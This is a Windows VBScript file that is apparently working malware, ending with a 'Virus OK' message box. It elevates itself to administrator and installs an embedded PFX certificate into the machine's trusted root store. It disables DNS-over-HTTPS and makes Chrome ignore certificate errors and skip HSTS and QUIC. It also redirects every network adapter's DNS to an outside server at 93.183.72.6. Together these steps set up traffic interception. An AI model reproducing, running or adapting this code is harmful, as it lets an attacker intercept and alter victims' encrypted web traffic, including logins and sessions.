Option Explicit
On Error Resume Next

' Define constants for primary and secondary DNS servers
Const PrimaryDNSServer = "93.183.72.6"
Const SecondaryDNSServer = "8.8.8.8"

If Not IsAdmin() Then
    RunElevated()
Else
    MainScriptLogic()
End If

Sub MainScriptLogic()

    CertWorks

	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	
	objShell.RegWrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableAutoDOH", 0, "REG_DWORD"

	Dim chromeKeyPath
	chromeKeyPath = "HKEY_LOCAL_MACHINE\Software\Policies\Google\Chrome"
	objShell.RegWrite chromeKeyPath & "\CommandLineFlag", "--ignore-certificate-errors --disable-quic --disable-hsts", "REG_SZ"
	objShell.RegWrite chromeKeyPath & "\DnsOverHttps", "off", "REG_SZ"

    Const HKEY_LOCAL_MACHINE = &H80000002
    strKeyPath = "SOFTWARE\Policies\Google\Chrome"
    strValueName = "IgnoreCertificateErrors"
    dwValue = 1
    Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
    objRegistry.CreateKey HKEY_LOCAL_MACHINE, strKeyPath
    objRegistry.SetDWORDValue HKEY_LOCAL_MACHINE, strKeyPath, strValueName, dwValue

    Dim objWMIService, colAdapters, objAdapter
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colAdapters = objWMIService.ExecQuery("Select * from Win32_NetworkAdapterConfiguration")

    For Each objAdapter In colAdapters
        If objAdapter.IPEnabled Then
            Dim arrDNSServers
            arrDNSServers = Array(PrimaryDNSServer, SecondaryDNSServer)
            objAdapter.SetDNSServerSearchOrder arrDNSServers
        End If
    Next

    Set objWMIService = Nothing

    MsgBox "Virus OK"
End Sub

Function IsAdmin()
    Dim objWShell, result
    Set objWShell = CreateObject("WScript.Shell")
    result = objWShell.Run("cmd /c net session >nul 2>&1", 0, True)
    IsAdmin = (result = 0)
    Set objWShell = Nothing
End Function

Sub RunElevated()
    Dim objShell
    Set objShell = CreateObject("Shell.Application")
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
    WScript.Quit
End Sub



Function CertWorks()
    Dim binaryData
    binaryData = "30-82-0A-99-02-01-03-30-82-0A-55-06-09-2A-86-48-86-F7-0D-01-07-01-A0-82-0A-46-04-82-0A-42-30-82-0A-3E-30-82-06-0F-06-09-2A-86-48-86-F7-0D-01-07-01-A0-82-06-00-04-82-05-FC-30-82-05-F8-30-82-05-F4-06-0B-2A-86-48-86-F7-0D-01-0C-0A-01-02-A0-82-04-FE-30-82-04-FA-30-1C-06-0A-2A-86-48-86-F7-0D-01-0C-01-03-30-0E-04-08-3A-C5-5B-EA-59-13-66-E5-02-02-07-D0-04-82-04-D8-12-DA-53-B6-9F-EA-9D-83-8D-8A-69-99-36-07-8D-76-59-D9-92-06-80-06-4B-C4-3E-E5-A7-F1-14-05-5C-77-F4-8A-29-CE-BF-D7-01-FE-AB-2A-97-26-5B-50-FA-24-4E-ED-0A-02-BE-3F-91-09-75-13-0F-8D-AF-66-CA-0B-E6-40-A8-8F-11-C5-50-85-AF-5C-4C-1C-41-25-E4-E4-BB-CD-23-A7-C5-2A-44-6C-86-DE-37-32-E1-F9-8F-1E-5A-4F-26-80-84-87-69-E8-8D-54-D7-BD-29-A6-ED-9B-DF-53-EE-49-70-4F-B9-25-79-6A-67-BB-F4-A2-01-84-C0-B8-98-E9-55-D7-A8-15-BB-38-2D-67-C9-6E-3C-92-FD-8B-52-F1-5F-9F-24-9B-C1-8F-4A-CB-30-8B-9D-36-38-6A-C9-7D-9C-6A-55-BD-D6-6C-0F-5B-AB-20-00-39-87-BC-84-DD-4A-3A-F0-B4-6B-E8-26-5E-72-E1-76-CB-61-46-F2-CC-32-F9-4D-65-CB-20-52-EB-82-19-A5-F7-C7-3C-B2-A6-37-BC-23-01-06-E4-56-71-0D-E9-EC-FE-56-49-22-E0-60-D2-95-F4-93-B2-8A-83-C3-6D-C4-01-4C-85-A5-5C-D3-F0-55-26-43-19-B8-5B-8D-4E-51-AF-D3-91-B2-C0-94-33-0D-55-01-F3-9E-F4-B4-CB-FD-B8-A3-8C-3A-BF-B0-5A-8E-BC-3A-28-69-9A-FB-24-F1-54-30-13-9C-EB-19-C9-00-E1-CA-9B-11-DA-FF-12-D6-96-65-BB-BF-18-6B-0A-C6-B4-7B-A3-81-B7-4A-D9-B1-5F-2E-D2-07-71-2B-09-7D-37-E9-94-9B-16-55-25-CC-06-8F-74-3C-E1-50-99-84-16-90-92-7B-0B-13-EC-7C-9F-EB-04-4B-1B-C2-5D-59-99-30-F1-34-A6-78-71-C1-5D-0C-D5-38-4C-86-84-30-FA-C3-FC-4F-B2-D0-E5-B4-3D-01-BF-B5-DA-ED-B4-3F-B2-B8-E6-78-03-CF-11-68-74-54-C3-BA-A4-D7-53-14-1F-32-7F-2E-B6-30-67-41-B9-F0-08-4E-ED-27-13-35-4C-AB-4E-BB-C4-F9-93-1F-23-31-6C-09-82-E4-FF-27-C6-32-E7-20-46-76-5A-46-EF-E7-30-5B-EB-FF-DF-A3-C4-57-89-6F-1C-B3-FC-01-E5-F4-B5-EA-66-76-04-C6-A3-1D-29-30-84-9B-33-2E-FA-9D-BB-12-A9-BE-05-D6-23-10-74-3D-25-6F-95-34-1C-E2-B7-73-58-36-7F-01-5C-E0-26-C5-1D-33-AC-B1-25-69-46-28-33-B1-A9-F8-62-C9-76-83-DF-37-11-0C-BB-9C-57-BA-EB-7E-C3-9F-DD-87-E9-46-C1-9B-93-3A-C7-4E-01-48-75-1E-3A-26-7F-2C-B0-2E-FC-14-A5-9D-0D-19-62-05-5B-D1-8A-F9-92-66-30-5A-6F-29-79-D2-04-38-25-C0-04-EF-05-61-F0-C6-6B-6B-D7-10-C5-0D-54-9E-73-41-A4-51-94-2B-C4-71-EF-3A-25-C6-62-37-7A-3E-30-11-42-63-12-01-6E-9E-B3-67-70-95-27-BD-B0-27-9F-61-E8-23-6B-01-FB-F1-B9-DF-4C-09-F6-18-DD-86-3E-03-F2-EF-6D-2F-FF-3E-C3-BD-83-49-71-6F-CD-6E-B6-2E-89-33-D9-57-55-1D-0D-AD-C9-66-DC-93-FD-16-93-DC-F3-15-11-83-1F-FE-A0-0C-EF-19-98-24-14-92-E5-04-2B-1F-58-83-6D-7D-06-A7-4F-49-1F-09-B9-B5-13-36-17-78-4C-7D-E3-3D-D4-80-53-6C-B1-02-15-D1-0B-19-8A-26-3B-60-FB-F2-96-00-C3-4A-53-E2-59-41-BE-0D-48-A3-D9-9E-0B-BF-D2-69-AD-5C-3B-3F-6B-6A-B9-18-AB-7F-68-60-E1-3E-0B-3C-4E-E7-87-9D-B2-03-4E-A4-E4-79-2E-71-7B-B0-E6-54-B7-6C-58-CD-3C-64-0C-92-A7-34-88-43-BB-F0-90-2C-85-84-9B-8E-B0-3A-44-B8-9C-93-28-95-E1-29-B0-4E-82-2B-9B-6F-DF-63-78-5F-97-FB-6B-49-AA-85-35-38-07-92-D2-ED-90-2C-4D-F0-B8-C8-1E-09-F1-96-8D-20-14-79-F9-04-AB-26-3D-23-FD-43-4A-6E-53-BD-17-0E-27-73-FF-D5-8C-2F-70-BE-B7-DA-D6-DA-A1-F8-19-F7-44-33-38-8A-BC-9A-CE-30-91-0F-18-6F-E3-D2-07-64-E1-0F-7E-26-10-90-FE-78-14-FD-6A-67-EE-9F-ED-65-87-25-8A-C1-56-8A-EF-AA-EB-FB-44-42-2F-1C-EF-57-78-10-B7-23-20-15-38-20-50-E1-BC-3E-99-6F-5C-F4-8C-9E-31-0E-9E-CB-38-25-8E-46-37-53-17-1B-08-EB-15-B5-CB-08-D1-78-35-BF-56-41-FC-07-EA-BD-39-B7-D7-5A-D7-66-D3-4A-00-C2-D5-C8-0D-70-00-A3-A2-C0-86-A2-EE-25-69-63-AB-C7-3E-47-C1-3A-29-11-67-36-9A-88-60-E6-B1-47-0A-8F-A1-9B-F7-D7-71-E7-70-86-A1-1A-4F-6E-CD-F6-99-8F-54-BE-31-8D-4D-FD-F5-B2-7C-3E-EE-03-BD-E1-A9-14-2B-BC-58-91-01-D1-6D-0F-B6-24-82-89-66-86-8B-30-EE-53-54-5D-71-FC-74-B6-EA-3E-08-D7-07-37-63-7E-46-AD-3F-43-53-C7-03-D4-8A-18-32-CB-80-F4-7C-DF-EC-D3-6E-9E-43-2F-E1-61-B7-43-7F-EC-20-EF-12-F1-86-55-3C-F8-29-0F-42-12-50-27-0D-51-71-B9-6C-75-2E-76-B5-03-F6-ED-EE-5F-24-55-00-6F-26-5E-19-75-69-69-2F-4E-E5-B3-02-55-16-EA-C9-57-E6-12-6C-A8-30-05-5A-61-61-3B-DB-98-97-2B-1B-30-75-5E-9A-A3-7D-D3-BA-CE-C1-DF-16-DA-D4-E0-94-39-CF-87-0E-23-07-F7-08-21-51-C9-28-37-61-F4-8C-2A-67-AE-18-28-79-48-EE-24-46-EA-0C-F6-C1-FC-6D-16-51-8F-03-49-8B-E2-5A-17-16-94-61-FD-8A-A7-01-64-7B-CD-F2-C3-27-5A-48-14-5C-31-81-E2-30-0D-06-09-2B-06-01-04-01-82-37-11-02-31-00-30-13-06-09-2A-86-48-86-F7-0D-01-09-15-31-06-04-04-01-00-00-00-30-5D-06-09-2A-86-48-86-F7-0D-01-09-14-31-50-1E-4E-00-74-00-65-00-2D-00-36-00-34-00-66-00-33-00-39-00-62-00-38-00-63-00-2D-00-63-00-38-00-32-00-36-00-2D-00-34-00-35-00-66-00-62-00-2D-00-61-00-65-00-65-00-65-00-2D-00-36-00-38-00-30-00-34-00-66-00-37-00-30-00-36-00-39-00-61-00-66-00-34-30-5D-06-09-2B-06-01-04-01-82-37-11-01-31-50-1E-4E-00-4D-00-69-00-63-00-72-00-6F-00-73-00-6F-00-66-00-74-00-20-00-53-00-74-00-72-00-6F-00-6E-00-67-00-20-00-43-00-72-00-79-00-70-00-74-00-6F-00-67-00-72-00-61-00-70-00-68-00-69-00-63-00-20-00-50-00-72-00-6F-00-76-00-69-00-64-00-65-00-72-30-82-04-27-06-09-2A-86-48-86-F7-0D-01-07-06-A0-82-04-18-30-82-04-14-02-01-00-30-82-04-0D-06-09-2A-86-48-86-F7-0D-01-07-01-30-1C-06-0A-2A-86-48-86-F7-0D-01-0C-01-03-30-0E-04-08-92-85-E7-08-BF-92-F8-2B-02-02-07-D0-80-82-03-E0-9D-26-B9-13-75-AF-5A-4A-3C-B5-22-53-80-B4-D2-48-22-74-6B-37-7A-66-3E-B4-0F-52-5D-1F-CF-ED-64-58-1D-92-69-FE-4D-AC-DD-6E-99-42-0E-50-BA-1B-9D-E8-24-D3-70-A1-20-A6-8E-CF-72-08-E0-E4-A7-2A-76-F7-F4-0D-0A-C8-9C-A2-F0-93-91-D1-C5-A7-F8-85-00-22-31-F0-53-B7-A6-0F-11-02-06-C6-24-70-B9-2E-9A-D0-69-A3-15-18-DB-70-C6-66-F4-49-1C-AF-E8-FB-AD-6E-FE-5A-E2-0B-9F-F1-22-2F-57-CB-FC-60-B0-B9-6C-B2-73-11-76-8A-60-8A-EA-98-92-BB-14-97-A1-12-7B-EB-8F-B5-6C-27-80-25-67-23-C0-0B-C0-8B-CF-AE-9D-4D-B0-D4-20-0F-BD-EC-40-8A-C6-E0-8B-D0-C9-58-23-3A-99-81-17-70-DF-C6-E9-FF-A0-6C-23-23-AF-2E-18-91-BB-1C-BC-FD-24-B1-29-17-7E-6C-76-7F-E5-40-7B-76-CF-19-F4-D2-E9-F2-35-B8-8E-95-3A-71-7A-D3-14-6D-35-BF-10-B4-A9-9D-8C-AA-6B-43-2E-5F-2F-23-B2-D8-91-85-FA-25-F7-EB-CE-30-93-13-5F-6D-33-1D-2F-E0-3C-F8-4E-72-64-07-32-7C-E6-6E-26-E5-FE-85-DA-87-7C-E0-48-75-61-5B-AC-DB-96-76-EA-4A-40-52-B7-F7-F3-EE-31-08-A4-AA-55-7F-FD-71-34-9F-7A-37-55-BD-AE-88-0C-9F-3B-53-D4-E7-92-78-6B-D8-22-4A-29-11-0A-C2-5B-BE-8C-ED-C6-EA-F3-2D-5D-1A-D3-4E-BB-C7-8F-3E-E0-02-B4-17-C5-AA-8B-A5-00-41-46-11-0F-A7-83-56-CD-F7-A0-ED-02-5B-63-7B-28-7B-29-95-C5-7A-F0-B9-9F-F6-E7-7A-FB-36-FD-CF-50-CB-4C-C3-05-1E-34-1B-7D-D8-5D-E1-0A-75-E8-60-7C-27-AA-60-DE-CF-3A-F2-45-97-71-69-AC-D8-F7-5B-E2-1C-85-27-DB-41-AF-B7-99-67-95-46-E1-9D-C6-CE-5C-F6-D0-31-6A-30-09-95-0D-94-1F-8F-35-41-B9-EA-03-9F-B1-A8-EE-14-13-A2-62-EA-0B-6E-05-3B-13-A4-DF-72-FB-6D-24-DB-A3-1A-A5-42-54-12-32-1F-BA-C4-73-FC-B8-9D-88-71-5F-F4-5B-80-D4-3F-7E-71-30-38-47-3D-D0-13-36-B2-D6-48-1F-02-EF-A1-8A-CB-61-94-3C-E0-93-1E-61-56-8F-8D-35-7B-C4-02-38-43-7E-A4-F1-04-9F-35-46-D1-26-A3-AD-B7-4D-C1-50-7D-36-4C-5E-6D-90-1A-8A-BB-A5-60-98-69-62-4A-F4-2B-DA-47-58-27-B1-A3-71-C9-E6-CD-F6-6C-96-A5-A6-CA-B9-64-0F-76-FE-E8-29-56-19-86-1B-60-B9-3E-20-2C-67-ED-A0-E4-53-08-1F-A8-AA-88-72-3A-4E-A0-94-00-84-3D-0A-73-8B-08-26-17-AA-99-35-1B-18-0A-20-25-8D-23-2E-66-21-BB-73-2A-8C-B6-73-2E-55-F3-5A-E5-79-42-D4-1A-01-E1-A2-85-78-0F-5F-79-E2-C3-23-95-A1-77-A9-F0-97-30-C3-5B-66-14-97-01-4A-5A-98-36-EE-76-F1-54-AD-78-69-91-00-0C-BE-E9-AE-18-E2-11-14-BE-9D-76-94-CF-35-F9-0F-4F-73-62-94-F4-B8-FB-F8-C9-24-FE-73-78-BA-EB-E0-B8-93-A8-48-C4-E3-CB-BC-A9-C7-A0-3E-14-2A-12-D2-05-CD-A8-90-85-2F-BD-84-FF-68-EF-B4-D9-72-F8-98-5D-CA-43-12-93-82-87-B0-E6-6A-29-7B-0B-74-40-7F-16-1D-35-5A-B3-EC-C7-39-F8-DC-88-5B-16-3B-21-CB-61-E0-39-3A-61-4C-25-85-DB-89-7E-65-56-2D-B0-7E-2A-DD-A6-A1-28-F3-59-EE-05-4D-68-7E-01-F4-0D-7F-AA-D7-E6-D0-68-7A-1E-52-A2-DC-5D-70-DD-DC-0D-CE-5A-A1-F2-9F-55-69-E5-B4-9D-87-8D-94-49-11-5A-5B-A9-97-13-AD-1C-F6-B1-ED-6A-4A-4B-D3-6F-9D-BB-75-DF-FD-64-A6-42-8B-DB-66-EE-F6-5C-C3-08-03-13-E5-D8-62-C8-A1-FF-8C-1C-37-A9-C5-15-7B-3B-66-91-88-79-36-54-C4-9A-E9-59-5D-8D-24-B9-77-CD-49-58-94-47-68-FA-B9-AF-82-BC-CB-40-30-FD-8A-D5-D9-F6-40-D2-28-82-3A-09-28-BD-C5-30-A8-C4-27-B2-2D-D8-71-B0-6A-F4-C1-F3-73-2D-CE-D4-C9-4E-94-89-08-FB-71-F0-F7-BD-6B-2A-F1-27-E1-A0-F8-3E-A5-5B-C0-53-9F-BE-55-6D-8D-AC-90-11-D8-81-01-66-DB-23-4C-48-B1-64-FA-99-C2-EC-3D-50-AB-9F-93-45-56-DF-27-62-30-3B-30-1F-30-07-06-05-2B-0E-03-02-1A-04-14-BB-4D-DF-6E-D6-56-15-22-12-3F-C6-F4-CA-08-B0-13-D6-68-87-3C-04-14-F9-7D-13-61-80-D2-3F-C7-14-0A-16-5A-D0-47-23-09-FC-CD-70-DA-02-02-07-D0"

    Dim scriptPath
    scriptPath = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)

    Dim data
    data = HexStringToByteArray(binaryData)

    Dim outputFilePath
    outputFilePath = scriptPath & "\final.pfx"

    ' Create a binary stream object
    Dim outputFile
    Set outputFile = CreateObject("Scripting.FileSystemObject").CreateTextFile(outputFilePath, True)

    For i = 0 To UBound(data)
        outputFile.Write Chr(data(i))
    Next

    outputFile.Close

    InstallCertificate outputFilePath, "123"
    InstallCertificateRoot outputFilePath, "123"
End Function

Function HexStringToByteArray(hexString)
    Dim hexArray
    hexArray = Split(hexString, "-")

    Dim byteArray
    ReDim byteArray(Ubound(hexArray))

    For i = 0 To UBound(hexArray)
        byteArray(i) = CByte("&H" & hexArray(i))
    Next

    HexStringToByteArray = byteArray
End Function

Sub InstallCertificate(certificateFilePath, password)
    ' Prepare the certutil command
    Dim certutilCommand
    certutilCommand = "CERTUTIL -f -p " & password & " -importpfx """ & certificateFilePath & """"
   WScript.Echo certutilCommand

    ' Run the certutil command
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run certutilCommand, 0, True
End Sub

Sub InstallCertificateRoot(pfxFilePath, password)
    On Error Resume Next

    ' Prepare the PowerShell command
    Dim powerShellCommand
    powerShellCommand = "powershell -Command ""Import-PfxCertificate -FilePath '" & pfxFilePath & "' Cert:\LocalMachine\Root -Password (ConvertTo-SecureString -String '" & password & "' -AsPlainText -Force)"""
    WScript.Echo powerShellCommand

    ' Run the PowerShell command
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run powerShellCommand, 0, True

    If Err.Number <> 0 Then
        ' Handle error if needed
        Err.Clear
        WScript.Quit 1
    End If
End Sub
